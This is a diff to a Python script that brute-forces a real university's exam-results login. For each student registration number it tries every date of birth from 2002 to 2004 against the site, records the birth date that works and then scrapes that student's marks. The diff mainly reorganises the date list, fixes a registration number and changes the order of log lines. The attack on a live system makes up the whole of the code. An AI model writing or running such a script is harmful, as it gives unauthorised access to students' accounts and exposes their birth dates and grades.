@@ -12,17 +12,19 @@ import csv
 class GetStudentMark:
 
     def __init__(self, rn) -> None:
-        self.regno = rn 
-        self.dates = pd.date_range('1/1/2003', periods = (365), freq ='d').strftime("%d/%m/%Y").tolist()
-        random.shuffle(self.dates)
-        self.dates += pd.date_range('7/1/2002', '12/31/2002', freq ='d').strftime("%d/%m/%Y").tolist() 
-        random.shuffle(self.dates)
-        self.dates += pd.date_range('1/1/2004', '6/30/2004', freq ='d').strftime("%d/%m/%Y").tolist()
-        random.shuffle(self.dates)
-        self.dates += pd.date_range('7/1/2004', '12/31/2004', freq ='d').strftime("%d/%m/%Y").tolist()
-        random.shuffle(self.dates)
-        self.dates += pd.date_range('1/1/2002', '6/30/2002', freq ='d').strftime("%d/%m/%Y").tolist()
-        random.shuffle(self.dates)
+        self.regno = str(rn) 
+        self.dates = []
+        d1 = pd.date_range('1/1/2003', periods = (365), freq ='d').strftime("%d/%m/%Y").tolist()
+        random.shuffle(d1)
+        d2 = pd.date_range('7/1/2002', '12/31/2002', freq ='d').strftime("%d/%m/%Y").tolist() 
+        random.shuffle(d2)
+        d3 = pd.date_range('1/1/2004', '6/30/2004', freq ='d').strftime("%d/%m/%Y").tolist()
+        random.shuffle(d3)
+        d4 = pd.date_range('7/1/2004', '12/31/2004', freq ='d').strftime("%d/%m/%Y").tolist()
+        random.shuffle(d4)
+        d5 = pd.date_range('1/1/2002', '6/30/2002', freq ='d').strftime("%d/%m/%Y").tolist()
+        random.shuffle(d5)
+        self.dates = d1 + d2 + d3 + d4 + d5
         self.totalDates = len(self.dates)
 
     url = "https://sist.sathyabama.ac.in/sist_ese_june_2023/login.php"
@@ -69,16 +71,16 @@ class GetStudentMark:
         attempt_no = 0
         for dob in self.dates:
             body = {
-                    "regno": str(self.regno),
+                    "regno": int(self.regno),
                     "dob" : dob
                     }
             reponse = requests.post(url=self.url, data=body)
-            print(f"trying..... {self.regno} : {dob}")
             print(f"remaing {self.totalDates-attempt_no} attempts")
+            print(f"trying..... {self.regno} : {dob}")
             if self.checkCredentialsCorrent(reponse.content):
                 print(f"dob found")
                 self.student_details.append([self.regno,dob])
-                self.saveDOB()
+                self.saveDOB(dob)
                 self.getMarks(dob, reponse.content)
                 break
             else:
@@ -101,7 +103,7 @@ if __name__ == "__main__":
 
     pd.DataFrame.to_csv(pd.DataFrame(columns=["regno", "DOB"], data=[]), "student_details.csv")
 
-    all_regno = [41110198, 4110189]
+    all_regno = [41110198, 41110189]
     # all_regno = getRegno()
 
     threads = []
